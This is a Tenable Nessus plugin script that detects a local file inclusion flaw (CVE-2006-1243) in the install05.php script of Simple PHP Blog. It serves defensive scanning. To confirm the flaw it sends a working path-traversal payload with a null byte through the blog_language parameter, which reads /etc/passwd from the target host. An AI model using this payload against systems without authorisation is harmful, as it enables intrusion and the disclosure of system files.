#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(21082);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-1243");
  script_bugtraq_id(17102);
  script_osvdb_id(24005);
  script_xref(name:"EDB-ID", value:"1581");

  script_name(english:"Simple PHP Blog install05.php blog_language Parameter Local File Inclusion");
  script_summary(english:"Tries to read a file using Simple PHP Blog");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include flaw." );
 script_set_attribute(attribute:"description", value:
"The version of Simple PHP Blog installed on the remote host fails to
sanitize input to the 'blog_language' parameter of the 'install05.php'
script before using it in a PHP 'require_once()' function.  An
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.simplephpblog.com/index.php?entry=entry060317-173547" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Simple PHP Blog version 0.4.7.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/13");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("sphpblog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


file = "../../../../../../../../../../../../etc/passwd";


# Test an install.
install = get_kb_item(string("www/", port, "/sphpblog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(
    dir, "/install05.php?",
    "blog_language=", file, "%00"
  );

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access might still be able to exploit the flaw.
    egrep(pattern:"main\(languages/.+/etc/passwd\\0/strings\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening required 'languages/.+/etc/passwd\\0/strings\.php'", string:res)
  )
  {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) contents = res - strstr(res, "<br ");
    else contents = "";

    if (report_verbosity && contents)
    {
      report = string(
        "\n",
        "Nessus was able to exploit this issue and obtain the contents of\n",
        "'/etc/passwd' using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:contents)
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
}
